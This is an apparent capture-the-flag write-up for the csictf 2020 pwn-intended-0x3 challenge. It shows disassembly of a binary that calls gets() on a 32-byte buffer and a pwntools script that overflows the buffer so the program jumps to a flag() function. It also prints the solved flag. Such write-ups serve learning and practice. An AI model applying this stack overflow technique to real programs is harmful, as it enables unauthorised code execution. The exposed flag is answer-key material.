This problem requires that you call a `flag()` function which reads the flag.
Looking at the disassembly, we can see another buffer, this time of size
`0x20` (32 in decimal).  
```r2  
┌ 104: int main (int argc, char **argv, char **envp);  
│           ; var char *s @ rbp-0x20  
│           0x00401166      55             push rbp  
│           0x00401167      4889e5         mov rbp, rsp  
│           0x0040116a      4883ec20       sub rsp, 0x20  
│           ; <redacted>, Setup stdio and print some text  
│           0x004011b6      488d45e0       lea rax, [s]  
│           0x004011ba      4889c7         mov rdi, rax                ; char
*s  
│           0x004011bd      b800000000     mov eax, 0  
│           0x004011c2      e899feffff     call sym.imp.gets           ;[3] ;
char *gets(char *s)  
│           0x004011c7      b800000000     mov eax, 0  
│           0x004011cc      c9             leave  
└           0x004011cd      c3             ret  
┌ 38: sym.flag ();  
│           0x004011ce      55             push rbp  
│           ; <redacted>, print the flag  
└           0x004011ef      e87cfeffff     call sym.imp.exit           ;[5] ;
void exit(int status)  
```

The exploit here is quite clear, we need to overwrite the return pointer of
the `main()` function to `0x004011ce` to run the `flag()` function. To do so,
we first need to send 32 bytes to fill up the input buffer, then send 8
bytes,\* and then the address `0x004011ce` as `\xce\x11@\x00\x00\x00\x00\x00`
(the `@` is just `\x40`).

\* One can find this out by debugging with [radare](https://www.radare.org/r/)
which will was described in [this](https://theavid.dev/dmoj-ctf-20-binexp)
blog post. It is *probably* for alignment, but to find out exactly why you'll
have to become a [glibc
librarian](https://www.gnu.org/software/libc/sources.html).

With that, our explain script, once again using
[pwntools](https://github.com/Gallopsled/pwntools/), can be seen below. We use
`p64` to convert the 64-bit address to the bytes described above.  
```py  
from pwn import *

p = process("./pwn-intended-0x3")  
p = remote("chall.csivit.com", 30013)  # Remove for local testing  
p.sendline(b"A" * (32 + 8) + p64(0x4011ce))  
p.interactive()  
```

And we get our flag, `csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}`, nice!

Original writeup (https://fluix.dev/blog/csictf-2020-pwn-intended/).